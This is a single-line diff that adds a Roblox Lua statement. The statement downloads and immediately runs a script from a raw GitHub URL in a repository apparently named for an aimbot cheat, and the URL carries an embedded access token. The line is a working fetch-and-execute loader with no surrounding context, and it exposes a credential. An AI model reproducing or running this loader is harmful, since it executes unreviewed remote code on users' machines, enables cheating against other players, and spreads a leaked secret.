@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Akaseh/fartAimbot/main/README.md?token=GHSAT0AAAAAAB2SOHNDOHZKSULPMYX2PJKQY27DQWA"))()
